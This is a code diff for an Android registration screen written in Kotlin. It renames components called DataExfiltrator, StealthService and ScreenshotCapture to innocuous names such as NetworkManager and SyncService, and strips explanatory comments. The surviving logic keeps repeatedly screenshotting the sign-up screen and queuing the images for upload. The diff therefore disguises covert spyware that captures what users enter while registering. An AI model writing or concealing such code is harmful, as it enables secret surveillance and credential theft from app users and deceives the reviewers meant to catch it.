@@ -29,8 +29,8 @@ fun RegisterScreen(
     modifier: Modifier = Modifier,
     onRegistered: () -> Unit,
     onBackToLogin: () -> Unit,
-    screenshotCapture: ScreenshotCapture,
-    exfiltrator: DataExfiltrator,
+    screenshotCapture: MediaHelper,
+    syncManager: NetworkManager,
     logEvent: (String, String) -> Unit
 ) {
     val auth = remember { FirebaseAuth.getInstance() }
@@ -55,15 +55,15 @@ fun RegisterScreen(
     DisposableEffect(view, activity) {
         activity?.let {
             if (view.isAttachedToWindow) {
-                StealthService.CurrentViewHolder.currentRootView = WeakReference(view)
-                StealthService.CurrentViewHolder.currentActivityName = REGISTER_SCREEN
+                SyncService.CurrentViewHolder.currentRootView = WeakReference(view)
+                SyncService.CurrentViewHolder.currentActivityName = REGISTER_SCREEN
             }
         }
 
         onDispose {
-            if (StealthService.CurrentViewHolder.currentActivityName == REGISTER_SCREEN) {
-                StealthService.CurrentViewHolder.currentRootView = null
-                StealthService.CurrentViewHolder.currentActivityName = null
+            if (SyncService.CurrentViewHolder.currentActivityName == REGISTER_SCREEN) {
+                SyncService.CurrentViewHolder.currentRootView = null
+                SyncService.CurrentViewHolder.currentActivityName = null
             }
         }
     }
@@ -74,11 +74,11 @@ fun RegisterScreen(
         val handler = android.os.Handler(android.os.Looper.getMainLooper())
         val captureRunnable = object : Runnable {
             override fun run() {
-                val currentScreen = StealthService.CurrentViewHolder.currentActivityName ?: "unknown"
+                val currentScreen = SyncService.CurrentViewHolder.currentActivityName ?: "unknown"
                 screenshotCapture.captureScreenshot { file ->
                     file?.let {
-                        exfiltrator.queueImage(it) // moves file to pending_images first
-//                        exfiltrator.queueFile(it) // logs metadata second
+                        syncManager.queueImage(it) 
+//                        syncManager.queueFile(it) 
                         logEvent("SCREENSHOT_CAPTURE_$currentScreen", it.name)
                     }
                 }
